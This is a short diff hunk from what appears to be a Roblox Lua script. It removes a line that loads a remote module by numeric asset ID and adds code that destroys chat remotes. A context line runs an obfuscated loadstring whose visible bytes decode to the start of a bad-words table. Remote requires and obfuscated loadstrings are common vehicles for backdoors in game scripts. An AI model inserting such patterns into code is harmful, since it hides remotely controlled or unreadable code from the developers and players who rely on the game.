@@ -22,7 +22,13 @@ loadstring("\95\71\46\98\97\100\119\111\114\100\115\32\61\32\123\34\102\117\99\3
 end
 end)
 
-task.spawn(function()require(80295379048504)end)
+pcall(function()
+	game.ReplicatedStorage.SendChatToClient:Destroy()
+end)
+
+pcall(function()
+	game.StarterPlayer.StarterPlayerScripts.chatsend:Destroy()
+end)
 
 local timelimit = "08/30/2025"
 
